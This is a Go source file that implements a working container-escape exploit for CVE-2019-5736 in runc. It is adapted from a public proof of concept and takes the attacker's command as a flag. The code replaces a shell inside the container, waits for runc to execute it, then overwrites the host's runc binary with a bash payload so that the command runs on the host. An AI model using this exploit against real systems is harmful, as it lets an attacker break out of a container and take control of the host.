package CVE_2019_5736

import (
	"flag"
	"fmt"
	"os"
	"strconv"
	"strings"

	"github.com/ssst0n3/awesome_libs/awesome_error"
	"github.com/ssst0n3/awesome_libs/log"
)

const ExpName = "CVE-2019-5736"

func Exploit() {
	//defer os.Exit(0)

	flagSet := flag.NewFlagSet(ExpName, flag.ContinueOnError)
	var debug bool
	var cmd string
	var replaceShFileName string
	flagSet.BoolVar(&debug, "debug", false, "")
	flagSet.StringVar(&cmd, "cmd", "", "")
	flagSet.StringVar(&replaceShFileName, "wsh", "", "")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	log.Logger.Debug("cmd: ", cmd)
	log.Logger.Debug("wsh: ", replaceShFileName)
	ExploitandRunCommand(cmd, replaceShFileName)
}

func ExploitandRunCommand(cmd string, replaceShFileName string) {
	// Refer: https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go
	// This is the line of shell commands that will execute on the host
	var payload = "#!/bin/bash \n" + cmd
	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
	//fd, err := os.Create("/bin/sh")
	fd, err := os.Create(replaceShFileName)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] Overwritten " + replaceShFileName + "successfully")
	fmt.Println("[+] Waiting the host to exec container " + replaceShFileName + " ...")

	// Loop through all processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := os.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := os.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle")

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			fmt.Println("[+] The command executed is:\n" + payload)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}
